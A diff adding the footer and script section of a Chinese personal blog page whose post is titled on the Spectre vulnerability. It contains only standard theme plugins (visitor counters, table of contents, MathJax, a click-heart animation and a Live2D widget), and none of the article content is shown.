+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a target="_blank" rel="nofollow noopener"><span>Jianliang Shen</span></a>
+      <i class="iconfont icon-love"></i>
+      <a target="_blank" rel="nofollow noopener">
+        <span>2023</span></a>
+    </div>
+    
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 1,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Spectre漏洞和原理&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+      icon: "❡"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js" ></script>
+
+  
+
+
+
+  
+  
+    <script>
+      !function (e, t, a) {
+        function r() {
+          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
+          requestAnimationFrame(r)
+        }
+
+        function n() {
+          var t = "function" == typeof e.onclick && e.onclick;
+          e.onclick = function (e) {
+            t && t(), o(e)
+          }
+        }
+
+        function o(e) {
+          var a = t.createElement("div");
+          a.className = "heart", s.push({
+            el: a,
+            x: e.clientX - 5,
+            y: e.clientY - 5,
+            scale: 1,
+            alpha: 1,
+            color: c()
+          }), t.body.appendChild(a)
+        }
+
+        function i(e) {
+          var a = t.createElement("style");
+          a.type = "text/css";
+          try {
+            a.appendChild(t.createTextNode(e))
+          } catch (t) {
+            a.styleSheet.cssText = e
+          }
+          t.getElementsByTagName("head")[0].appendChild(a)
+        }
+
+        function c() {
+          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+        }
+
+        var s = [];
+        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
+          setTimeout(e, 1e3 / 60)
+        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
+      }(window, document);
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"react":{"opacityDefault":1,"opacityOnHover":1},"log":false,"tagMode":false});</script></body>
+</html>
